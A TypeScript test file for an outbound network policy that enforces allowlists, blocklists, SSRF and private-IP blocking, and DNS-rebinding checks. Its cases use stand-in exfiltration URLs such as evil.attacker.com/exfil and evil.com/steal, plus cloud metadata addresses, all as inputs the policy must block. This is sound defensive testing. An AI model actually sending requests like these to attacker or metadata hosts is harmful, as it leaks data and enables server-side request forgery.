import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest';
import {
  OutboundNetworkPolicy,
  resetOutboundNetworkPolicy,
  getOutboundNetworkPolicy,
} from '../../src/security/outboundNetworkPolicy';

describe('OutboundNetworkPolicy', () => {
  let policy: OutboundNetworkPolicy;

  beforeEach(() => {
    resetOutboundNetworkPolicy();
    policy = new OutboundNetworkPolicy({
      enabled: true,
      allowlist: ['api.openai.com', 'api.anthropic.com'],
      blocklist: ['evil.com'],
    });
  });

  afterEach(() => {
    policy.uninstall();
    resetOutboundNetworkPolicy();
  });

  describe('check', () => {
    it('allows URLs in the allowlist', () => {
      expect(policy.check('https://api.openai.com/v1/chat').allowed).toBe(true);
      expect(policy.check('https://api.anthropic.com/v1/messages').allowed).toBe(true);
    });

    it('denies localhost and loopback even if allowlisted', () => {
      const p = new OutboundNetworkPolicy({
        enabled: true,
        allowlist: ['localhost', '127.0.0.1', 'api.openai.com'],
        blocklist: [],
        blockPrivateIPs: true,
      });
      expect(p.check('http://localhost:3000/api').allowed).toBe(false);
      expect(p.check('http://127.0.0.1:3000/api').allowed).toBe(false);
      expect(p.check('http://[::1]/api').allowed).toBe(false);
      expect(p.check('http://[fd00::1]/').allowed).toBe(false);
      expect(p.check('http://metadata.google.internal/').allowed).toBe(false);
    });

    it('default allowlist does not include loopback', () => {
      const p = new OutboundNetworkPolicy({ enabled: true });
      const cfg = p.getConfig();
      expect(cfg.allowlist).not.toContain('localhost');
      expect(cfg.allowlist).not.toContain('127.0.0.1');
      expect(cfg.allowlist).toContain('api.openai.com');
    });

    it('allows subdomains of allowlisted domains', () => {
      const p = new OutboundNetworkPolicy({
        enabled: true,
        allowlist: ['example.com'],
        blocklist: [],
      });
      expect(p.check('https://api.example.com/path').allowed).toBe(true);
      expect(p.check('https://sub.api.example.com/path').allowed).toBe(true);
    });

    it('blocks URLs not in the allowlist', () => {
      const result = policy.check('https://evil.attacker.com/exfil');
      expect(result.allowed).toBe(false);
      expect(result.reason).toContain('not in allowlist');
    });

    it('blocks URLs in the blocklist (even if allowlisted)', () => {
      const p = new OutboundNetworkPolicy({
        enabled: true,
        allowlist: ['evil.com'],
        blocklist: ['evil.com'],
      });
      const result = p.check('https://evil.com/steal');
      expect(result.allowed).toBe(false);
      expect(result.reason).toContain('blocklist');
    });

    it('blocks private IPs for SSRF defense', () => {
      const p = new OutboundNetworkPolicy({
        enabled: true,
        allowlist: ['api.openai.com'],
        blocklist: [],
        blockPrivateIPs: true,
      });
      expect(p.check('http://10.0.0.1/internal').allowed).toBe(false);
      expect(p.check('http://192.168.1.1/admin').allowed).toBe(false);
      expect(p.check('http://172.16.0.1/admin').allowed).toBe(false);
      expect(p.check('http://169.254.169.254/latest/meta-data').allowed).toBe(false);
      expect(p.check('http://100.64.0.1/internal').allowed).toBe(false);
      expect(p.check('http://[fe90::1]/internal').allowed).toBe(false);
      expect(p.check('http://[::]/internal').allowed).toBe(false);
      expect(p.check('http://[ff02::1]/internal').allowed).toBe(false);
      expect(p.check('http://[2001:db8::1]/internal').allowed).toBe(false);
      expect(p.check('http://224.0.0.1/internal').allowed).toBe(false);
    });

    it('blocks private IPs even when explicitly in allowlist', () => {
      const p = new OutboundNetworkPolicy({
        enabled: true,
        allowlist: ['127.0.0.1', 'localhost', '10.0.0.1'],
        blocklist: [],
        blockPrivateIPs: true,
      });
      expect(p.check('http://127.0.0.1:3000/api').allowed).toBe(false);
      expect(p.check('http://localhost:3000/api').allowed).toBe(false);
      expect(p.check('http://10.0.0.1/internal').allowed).toBe(false);
    });

    it('checkAsync allows public allowlisted host (DNS mock)', async () => {
      const dns = await import('node:dns');
      const original = dns.promises.lookup;
      dns.promises.lookup = (async () => [
        { address: '104.18.0.1', family: 4 },
      ]) as typeof dns.promises.lookup;
      try {
        const p = new OutboundNetworkPolicy({
          enabled: true,
          allowlist: ['api.openai.com'],
          blocklist: [],
          blockPrivateIPs: true,
        });
        const result = await p.checkAsync('https://api.openai.com/v1/chat');
        expect(result.allowed).toBe(true);
      } finally {
        dns.promises.lookup = original;
      }
    });

    it('checkAsync denies when DNS resolves to private IP', async () => {
      const dns = await import('node:dns');
      const original = dns.promises.lookup;
      dns.promises.lookup = (async () => [
        { address: '127.0.0.1', family: 4 },
      ]) as typeof dns.promises.lookup;
      try {
        const p = new OutboundNetworkPolicy({
          enabled: true,
          allowlist: ['evil.example.com'],
          blocklist: [],
          blockPrivateIPs: true,
        });
        const result = await p.checkAsync('https://evil.example.com/x');
        expect(result.allowed).toBe(false);
        expect(result.reason).toMatch(/private IP|DNS/);
      } finally {
        dns.promises.lookup = original;
      }
    });

    it('checkAsync denies compressed, expanded, and dotted IPv4-mapped private DNS answers', async () => {
      const dns = await import('node:dns');
      const original = dns.promises.lookup;
      const answers = ['::ffff:127.0.0.1', '::ffff:7f00:1', '0:0:0:0:0:ffff:7f00:1'];
      try {
        const p = new OutboundNetworkPolicy({
          enabled: true,
          allowlist: ['rebind.example.com'],
          blocklist: [],
          blockPrivateIPs: true,
        });
        for (const address of answers) {
          dns.promises.lookup = (async () => [
            { address, family: 6 },
          ]) as typeof dns.promises.lookup;
          const result = await p.checkSsrfAsync('https://rebind.example.com/x');
          expect(result.allowed, address).toBe(false);
        }
      } finally {
        dns.promises.lookup = original;
      }
    });

    it('checkSsrfAsync denies non-global IPv6 DNS answers', async () => {
      const dns = await import('node:dns');
      const original = dns.promises.lookup;
      const answers = ['::', 'ff02::1', '100::1', '64:ff9b:1::1', '2001:db8::1', '3fff::1'];
      try {
        const p = new OutboundNetworkPolicy({ enabled: true, blockPrivateIPs: true });
        for (const address of answers) {
          dns.promises.lookup = (async () => [
            { address, family: 6 },
          ]) as typeof dns.promises.lookup;
          const result = await p.checkSsrfAsync('https://dns-rebind.example.com/x');
          expect(result.allowed, address).toBe(false);
        }
      } finally {
        dns.promises.lookup = original;
      }
    });

    it('checkSsrfAsync preserves a globally routable IPv6 DNS answer', async () => {
      const dns = await import('node:dns');
      const original = dns.promises.lookup;
      dns.promises.lookup = (async () => [
        { address: '2001:4860:4860::8888', family: 6 },
      ]) as typeof dns.promises.lookup;
      try {
        const p = new OutboundNetworkPolicy({ enabled: true, blockPrivateIPs: true });
        const result = await p.checkSsrfAsync('https://public-v6.example.com/x');
        expect(result.allowed).toBe(true);
        expect(result.addresses).toEqual(['2001:4860:4860::8888']);
      } finally {
        dns.promises.lookup = original;
      }
    });

    it('ssrfCheckedFetch rejects a private DNS answer before connecting', async () => {
      const dns = await import('node:dns');
      const original = dns.promises.lookup;
      dns.promises.lookup = (async () => [
        { address: '127.0.0.1', family: 4 },
      ]) as typeof dns.promises.lookup;
      try {
        const p = new OutboundNetworkPolicy({ enabled: true, blockPrivateIPs: true });
        await expect(p.ssrfCheckedFetch('https://rebind.example.com/secret')).rejects.toThrow(
          /OUTBOUND_BLOCKED.*private IP/,
        );
      } finally {
        dns.promises.lookup = original;
      }
    });

    it('checkAsync returns public addresses for pinning', async () => {
      const dns = await import('node:dns');
      const original = dns.promises.lookup;
      dns.promises.lookup = (async () => [
        { address: '104.18.0.1', family: 4 },
      ]) as typeof dns.promises.lookup;
      try {
        const p = new OutboundNetworkPolicy({
          enabled: true,
          allowlist: ['api.openai.com'],
          blocklist: [],
          blockPrivateIPs: true,
        });
        const result = await p.checkAsync('https://api.openai.com/v1/chat');
        expect(result.allowed).toBe(true);
        expect(result.addresses).toEqual(['104.18.0.1']);
      } finally {
        dns.promises.lookup = original;
      }
    });

    it('checkSsrfAsync allows non-allowlisted public hosts', async () => {
      const dns = await import('node:dns');
      const original = dns.promises.lookup;
      dns.promises.lookup = (async () => [
        { address: '93.184.216.34', family: 4 },
      ]) as typeof dns.promises.lookup;
      try {
        const p = new OutboundNetworkPolicy({
          enabled: true,
          allowlist: ['api.openai.com'],
          blocklist: [],
          blockPrivateIPs: true,
        });
        const result = await p.checkSsrfAsync('https://example.com/hook');
        expect(result.allowed).toBe(true);
        expect(result.addresses).toEqual(['93.184.216.34']);
      } finally {
        dns.promises.lookup = original;
      }
    });

    it('handles malformed URLs', () => {
      const result = policy.check('not-a-url');
      expect(result.allowed).toBe(false);
      expect(result.reason).toBe('malformed URL');
    });
  });

  describe('install / uninstall', () => {
    it('patches globalThis.fetch when installed', () => {
      const original = globalThis.fetch;
      policy.install();
      expect(globalThis.fetch).not.toBe(original);
      expect((globalThis.fetch as unknown as { __outboundPolicy?: boolean }).__outboundPolicy).toBe(
        true,
      );
    });

    it('restores original fetch when uninstalled', () => {
      const original = globalThis.fetch;
      policy.install();
      expect(globalThis.fetch).not.toBe(original);
      policy.uninstall();
      expect(globalThis.fetch).toBe(original);
    });

    it('blocks fetch to non-allowlisted domains', async () => {
      policy.install();
      await expect(fetch('https://evil.attacker.com/exfil')).rejects.toThrow('OUTBOUND_BLOCKED');
    });

    it('allows fetch to allowlisted domains', async () => {
      const url = 'https://api.openai.com/v1/models';
      const originalFetch = globalThis.fetch;
      const upstreamResponse = new Response('{}', { status: 200 });
      const upstreamFetch = vi.fn(async () => upstreamResponse);
      globalThis.fetch = upstreamFetch as typeof globalThis.fetch;

      try {
        expect(policy.check(url).allowed).toBe(true);
        // DNS/private-address enforcement and pinning have dedicated tests above.
        // This case isolates the install wrapper and allowed-request forwarding.
        const checkAsync = vi
          .spyOn(policy, 'checkAsync')
          .mockResolvedValue({ allowed: true, domain: 'api.openai.com' });
        policy.install();

        await expect(fetch(url)).resolves.toBe(upstreamResponse);
        expect(checkAsync).toHaveBeenCalledWith(url);
        expect(upstreamFetch).toHaveBeenCalledOnce();
      } finally {
        policy.uninstall();
        globalThis.fetch = originalFetch;
      }
    });

    it('does not install when disabled', () => {
      const p = new OutboundNetworkPolicy({ enabled: false });
      const original = globalThis.fetch;
      p.install();
      expect(globalThis.fetch).toBe(original);
      p.uninstall();
    });
  });

  describe('audit logs', () => {
    it('records blocked requests in audit log', async () => {
      policy.install();
      try {
        // Trigger a blocked request (patched fetch is async via checkAsync)
        await fetch('https://evil.attacker.com/exfil').catch(() => {});
      } catch {
        // ignore
      }
      const logs = policy.getAuditLogs();
      const blockedLog = logs.find((l) => !l.allowed);
      expect(blockedLog).toBeDefined();
      expect(blockedLog?.domain).toBe('evil.attacker.com');
    });
  });

  describe('runtime configuration', () => {
    it('allowDomain adds to allowlist', () => {
      policy.allowDomain('api.newservice.com');
      expect(policy.check('https://api.newservice.com/v1').allowed).toBe(true);
    });

    it('blockDomain adds to blocklist', () => {
      policy.blockDomain('api.openai.com');
      expect(policy.check('https://api.openai.com/v1').allowed).toBe(false);
    });

    it('updateConfig merges changes', () => {
      policy.updateConfig({ blockPrivateIPs: false });
      const config = policy.getConfig();
      expect(config.blockPrivateIPs).toBe(false);
    });
  });

  describe('singleton', () => {
    it('getOutboundNetworkPolicy returns same instance', () => {
      const p1 = getOutboundNetworkPolicy({ enabled: true });
      const p2 = getOutboundNetworkPolicy();
      expect(p1).toBe(p2);
    });

    it('resetOutboundNetworkPolicy clears singleton', () => {
      const p1 = getOutboundNetworkPolicy({ enabled: true });
      resetOutboundNetworkPolicy();
      const p2 = getOutboundNetworkPolicy({ enabled: false });
      expect(p1).not.toBe(p2);
    });
  });
});
